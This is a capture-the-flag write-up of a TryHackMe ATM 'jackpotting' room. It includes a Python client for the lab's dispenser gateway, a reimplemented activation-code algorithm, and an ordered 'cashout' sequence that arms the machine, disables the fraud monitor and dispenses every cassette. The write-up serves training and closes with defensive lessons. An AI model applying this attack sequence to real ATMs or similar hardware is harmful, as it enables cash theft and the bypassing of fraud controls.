# Jackpot - ATM XFS Dispenser (TryHackMe)

- **Path:** TryHackMe challenge room (ATM "jackpotting" / protocol + binary RE).
- **Completed:** 2026-10-11 - **Target:** <ip> (over standard THM VPN). Solved LIVE headless
  from own Windows PC (Python sockets + static ELF reversing with capstone/pyelftools).
- **Flag:** THM{…}

Scenario: a branch ATM left its engineering/maintenance interface reachable on the LAN. It speaks
the dispenser's native protocol (CEN/XFS CDM) with weak auth. Goal: empty every cassette.

## Recon
- Ports: 22 (SSH), 8080 (HTTP engineering console, Python BaseHTTP), 9100 (the dispenser gateway).
- 9100 greets with a length-framed JSON banner: "Branch Engineering Gateway", "protocol: XFS bridge"
  and SELF-DOCUMENTS its wire format:
  - request: `1 byte msg_type + 4 byte BE command_id + 2 byte BE length + <length> data`
  - reply:   `2 byte BE length + <length> bytes JSON`
  - msg_types: GETINFO=0x01, EXECUTE=0x02
  - hint: GETINFO command 0x0304 (WFS_INF_CDM_CAPABILITIES) = full command table.
- 8080 console (same page on every path) renders status and links a downloadable service tool at
  `/jackpot` that "derives a supervisor activation code from the session code shown above".

## Protocol (minimal client)
```python
import socket, struct
def xfs(mt, cmd, data=b'', host='<ip>'):
    s=socket.socket(); s.connect((host,9100))
    glen=struct.unpack('>H', s.recv(2))[0]; s.recv(glen)          # consume greeting
    s.send(bytes([mt]) + struct.pack('>I',cmd) + struct.pack('>H',len(data)) + data)
    rlen=struct.unpack('>H', s.recv(2))[0]
    rb=b''
    while len(rb)<rlen: rb+=s.recv(rlen-len(rb))
    s.close(); return rb
```
Command table (GETINFO 0x0304): WFS_INF_CDM_STATUS 0x301, WFS_INF_CDM_CASH_UNIT_INFO 0x303,
WFS_CMD_CDM_DISPENSE 0x401, WFS_CMD_CDM_ARM 0x4f0, WFS_CMD_CDM_SET_MONITOR 0x4f1,
WFS_CMD_CDM_GET_FLAG 0x4ff. max_dispense 40. Cassettes: CST1 $10x100, CST2 $20x80, CST3 $50x60,
CST4 $100x40 = 280 notes. STATUS exposes a rotating `nonce` (session code), `armed`, `monitor_on`,
`locked`, `flag_released`.

## The activation code (reverse the service tool)
- `/jackpot` is a stripped x86-64 Linux ELF. Usage: `jackpot <6-digit session code>` ->
  prints `activation code: %08u`. No Linux available locally, so reversed it statically
  (capstone + pyelftools disassembly). The algorithm:
  - FNV-1a 64-bit: offset basis 0xcbf29ce484222325, prime 0x100000001b3.
  - Loop 1: FNV-1a over the input string (the nonce digits): `h = (h ^ b) * prime`.
  - Loop 2: continue over the constant salt `"ENBANK"`, with an extra avalanche per byte:
    `h = (h ^ b) * prime; h = h ^ (h >> 29)`.
  - activation code = `h % 100000000` (zero-padded to 8 digits).
```python
MASK=(1<<64)-1; prime=0x100000001b3
def activation(nonce):
    h=0xcbf29ce484222325
    for b in nonce.encode(): h=((h^b)*prime)&MASK
    for b in b'ENBANK':
        h=((h^b)*prime)&MASK; h=(h^(h>>29))&MASK
    return f'{h%100000000:08d}'
```

## Exploitation (the cashout)
Order matters. The fraud monitor must be disabled BEFORE dispensing.
1. Read STATUS -> current `nonce`. Compute `activation(nonce)`.
2. ARM: EXECUTE 0x4f0 with the code as RAW BYTES (not JSON; JSON forms return INVALIDCODE).
   `xfs(0x02, 0x4f0, code.encode())` -> "armed - supervisor mode".
3. Disable fraud monitor: EXECUTE 0x4f1 with raw `b'off'` -> `monitor_on: false`.
4. DISPENSE: EXECUTE 0x401 with EMPTY data dispenses 40 notes/call. Loop ~7 times until
   `remaining_notes == 0`.
5. GET_FLAG: EXECUTE 0x4ff -> `{"rc":"WFS_SUCCESS","flag":"THM{…}"}`.

## Gotcha (the fraud lock)
Dispensing while `monitor_on` is true triggers `WFS_ERR_CDM_LOCKED` ("anomalous dispense with null
transaction id -> machine locked", ~45s). The lock RESETS state: disarms, ROLLS BACK the dispensed
cash (remaining back to 280), and ROTATES the nonce. So any arm/dispense done before the lock is
undone, and the activation code must be recomputed for the new nonce. Correct sequence
(arm -> set_monitor off -> dispense) avoids the lock entirely.

## Lessons learned
- A self-documenting maintenance protocol on the LAN with no real auth is the whole vuln: read the
  banner, pull the capability/command table, drive it.
- "Auth" that is a code derived from a client-visible session value by a downloadable tool is not
  auth: reverse the tool (or just run it) and mint codes at will. Static RE beats needing the
  runtime - identify the constants (FNV offset basis 0xcbf29ce484222325, prime 0x100000001b3,
  salt "ENBANK", mod 10^8) and reimplement.
- Watch exact wire framing (raw bytes vs JSON): ARM only accepted the raw code string.
- Defenses that roll back and rotate on anomaly still lose if the attacker can disable the monitor
  first; the fix is to not expose privileged hardware commands to an unauthenticated network peer.
